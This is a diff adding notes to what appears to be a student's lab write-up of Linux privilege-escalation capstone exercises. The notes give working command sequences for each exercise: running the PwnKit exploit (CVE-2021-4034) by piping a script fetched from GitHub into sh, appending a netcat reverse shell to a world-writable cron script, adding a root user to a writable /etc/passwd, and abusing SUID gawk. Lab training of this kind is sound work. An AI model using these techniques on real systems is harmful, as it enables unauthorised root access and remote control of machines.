@@ -196,20 +196,181 @@ sudo gcc -wrapper /bin/sh,-s .
 
 2. **Capstone Exercise**: Connect to VM 2 with the provided credentials and gain a root shell by abusing a different kernel vulnerability.
 
+Alright.. it's capstone, so let's try all the things
+```bash
+# Search for sudo abuse
+sudo -l
+	[sudo] password for joe: 
+	Sorry, user joe may not run sudo on ubuntu-privesc.
 
+# Search for setuid binaries or capabilities
+/usr/sbin/getcap -r / 2>/dev/null
+	#<no results>
 
+find / -perm -u=s -type f 2>/dev/null
+	/usr/lib/snapd/snap-confine
+	/usr/lib/policykit-1/polkit-agent-helper-1
+	/usr/lib/eject/dmcrypt-get-device
+	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+	/usr/lib/openssh/ssh-keysign
+	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+	/usr/bin/sudo
+	/usr/bin/newuidmap
+	/usr/bin/chsh
+	/usr/bin/newgrp
+	/usr/bin/gpasswd
+	/usr/bin/passwd
+	/usr/bin/newgidmap
+	/usr/bin/chfn
+	/usr/bin/at
+	/usr/bin/pkexec
+	/bin/su
+	/bin/fusermount
+	/bin/ping
+	/bin/ntfs-3g
+	/bin/mount
+	/bin/umount
+	/bin/ping6
+```
 
+- Did a bunch of research into all the binaries.  Lots of googling for 'binary privilege escalation'
+- **pkexec** had a lot of hits - [CVE-2021-4034 PwnKit](https://ine.com/blog/exploiting-pwnkit-cve-20214034)
+- Code from [Packet Storm](https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html) wouldn't work because of a library's different version
+- Trying a [self-contained exploit](https://github.com/ly4k/PwnKit)
+```bash
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+	root@ubuntu-privesc:/home/joe# id
+		uid=0(root) gid=0(root) groups=0(root),1001(joe)
+	root@ubuntu-privesc:/home/joe# cat /root/flag.txt
+		OS{17f09f4a7a11c53548a96256cde7395a}
+```
 
 
 3. **Capstone Exercise**: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.
 
+```bash
+# Check sudo access
+sudo -l
+	[sudo] password for student: 
+	Sorry, user student may not run sudo on 7b0ba44e34ba.
 
+crontab -l
+	no crontab for student
+
+ls /etc/cron*
+	/etc/crontab
+	
+	/etc/cron.d:
+	e2scrub_all
+	
+	/etc/cron.daily:
+	apt-compat  dpkg  exim4-base  man-db
+	
+	/etc/cron.hourly:
+	archiver
+	
+	/etc/cron.monthly:
+	
+	/etc/cron.weekly:
+	man-db
+
+
+# Check out archiver
+cat /etc/cron.hourly/archiver 
+	#!/bin/sh
+	
+	# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
+	/var/archives/archive.sh
+
+
+ls -l /var/archives/archive.sh                                                                                                          
+	-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh
+
+
+cat /var/archives/archive.sh 
+	#!/bin/bash
+	
+	TIMESTAMP=$(date +"%T")
+	echo "$TIMESTAMP running the archiver"
+	#cp -rf /home/kali/ /var/backups/kali/
+	cp -rf /home/student/ /var/backups/student/
+
+
+# Edit /var/archives/archive.sh to add in a reverse shell via named pipe
+echo >> /var/archives/archive.sh
+echo "rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.238 5555 > /tmp/f" >> /var/archives/archive.sh
+
+# nc listener on attack machine
+nc -nlvp 5555
+	listening on [any] 5555 ...
+	connect to [192.168.45.238] from (UNKNOWN) [192.168.180.52] 42652
+	/bin/sh: 0: can''t access tty; job control turned off
+	# id
+		uid=0(root) gid=0(root) groups=0(root)
+	# cat /root/flag.txt
+		OS{785acadbe08ed64be6c0f36639d6a223}
+```
 
 
 
 4. **Capstone Exercise**: On the Module Exercise VM 4, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.
 
+```bash
+# Check sudo perms
+sudo -l
+	Sorry, user student may not run sudo on 54c2616d3074.
 
+#################################################
+# No cron jobs, setuid binaries or capabilities #
+#################################################
+
+ls -l /etc/passwd
+-rw-rw-rw- 1 root root 1370 May  2 21:50 /etc/passwd
+
+# Add new root user
+openssl passwd hell0
+	8hV.undkvo6HU
+
+echo "root2:8hV.undkvo6HU:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+su root2
+	Password: 
+
+# cat /root/flag.txt
+	OS{38ccf7e48021add8de461e3fbb1c37db}
+```
 
 
 5. **Capstone Exercise**: Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the Module Exercise VM 5. Binary flags and custom shell are what to look for.
+
+```bash
+# Check for sudo privs
+sudo -l
+	-bash: sudo: command not found        # AMAAAAAZING
+
+# Check setuid
+find / -perm -u=s -type f 2>/dev/null
+/bin/umount
+/bin/su
+/bin/mount
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/find
+/usr/bin/chfn
+/usr/bin/gawk
+/usr/bin/vim.basic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+
+# https://gtfobins.github.io/gtfobins/gawk/#limited-suid
+gawk 'BEGIN {system("/bin/sh")}'
+# id
+	uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
+# cat /root/flag.txt
+	Great job! You found me.
+	Here is your flag:
+	
+	OS{47d009055d871a63cc9eee6361d647b7}
+```
